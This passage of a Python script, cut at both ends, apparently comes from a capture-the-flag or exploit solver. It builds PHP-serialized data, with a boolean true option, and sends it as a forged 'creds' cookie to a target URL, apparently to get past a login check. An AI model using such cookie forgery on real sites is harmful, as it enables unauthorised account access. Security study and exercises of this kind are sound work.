    's:%d:"%s";%s' % (len(k), k, (
        'b:1;' if v is True else
        'i:%d;' % v if isinstance(v, int) else
        's:%d:"%s";' % (len(v), v)
    ))
    for k,v in d.items()
))

def req(cookie):
    req = urllib.request.Request(base, headers={'Cookie': f'creds={cookie}'})
    return urllib.request.urlopen(req, timeout=10).read().decode('latin-1','ignore')

# Baseline
